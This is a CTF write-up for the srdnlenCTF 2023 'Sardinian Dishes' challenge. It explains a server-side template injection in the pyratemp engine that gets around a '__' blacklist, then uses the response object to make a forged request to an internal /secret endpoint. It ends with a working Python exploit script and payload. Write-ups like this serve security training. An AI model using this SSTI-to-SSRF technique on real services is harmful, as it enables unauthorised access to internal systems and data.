# srdnlenctf 2023

## Sardinian Dishes (X solves)

I think that a friend of mine is using this recipe sharing website to sell illegal cheese. Can you find a way to access the forbidden recipe?

And while you're there, share some of you worst best local recipes.

### Solution

This challenge shows an SSTI with an esotic template engine (pyratemp) in which RCE is impossible due to a blacklist that filters '__'. The goal is to carry out an SSRF attack to request the endpoint /secret on the backend. To achieve this goal the requests res object can be abused in the SSTI to perform another request to the backend. The res object can be used to access the request itself which has a function called prepare_url that modifies the url of the request. The res object also has a connection attribute which can be used to call the send function which receives a request as parameter and performs the get request. We can exploit this to make a request to the /secret endpoint and leak the flag.

### Exploit

```python
#!/bin/env python3

import requests
import re

req = requests.session()

url = "http://sardiniandishes.challs.srdnlen.it"

payload= "@! res.request.prepare_url('http://backend:5000/secret','') !@ @! res.connection.send(res.request).text !@"
res = req.get(url+"/recipe?name="+payload)
res = res.text

flag = re.search("srdnlen{(.*)}", res).group(0)
print(flag)

```
